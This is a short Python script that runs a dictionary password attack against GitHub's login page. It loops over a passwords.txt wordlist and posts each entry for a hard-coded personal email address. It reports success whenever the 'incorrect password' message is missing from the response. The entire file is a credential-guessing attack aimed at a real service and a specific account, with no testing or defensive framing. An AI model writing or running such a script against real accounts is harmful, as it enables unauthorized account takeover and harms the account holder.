#! /usr/bin/env python

import requests
import sys

target_url="https://github.com/login"
def login(password):
    login_data = {"login": "poojarivicky3@yahoo.com", "password": "", "commit": "Sign in"}
    login_data["password"]=password
    response = requests.post(target_url, data=login_data)
    return response

def verifyPassword():
    with open("passwords.txt","r") as password_list:
        for password in password_list:
            password = password.strip()
            response = login(password)
            if "Incorrect username or password" not in str(response.content):
                print("[+]Password found --> " + password)
                sys.exit(0)


verifyPassword()
print("[-]Password Not found")